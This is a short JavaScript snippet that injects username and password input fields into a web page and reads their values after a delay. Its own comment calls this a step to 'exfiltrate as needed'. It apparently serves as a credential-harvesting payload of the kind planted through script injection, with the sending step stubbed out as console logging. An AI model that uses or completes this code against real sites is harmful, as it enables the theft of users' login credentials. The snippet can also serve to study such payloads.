// create the input elements
let usernameField = document.createElement("input")
usernameField.type = "text"
usernameField.name = "username"
usernameField.id = "username"

let passwordField = document.createElement("input")
passwordField.type = "password"
passwordField.name = "password"
passwordField.id = "password"

// append the elements to the body of the page
document.body.appendChild(usernameField)
document.body.appendChild(passwordField)

// exfiltrate as needed (note that we need to wait for the fields to be filled before exfiltrating the information)
setTimeout(function() {
  console.log("Username:", document.getElementById("username").value)
  console.log("Password:", document.getElementById("password").value)
}, 1000);

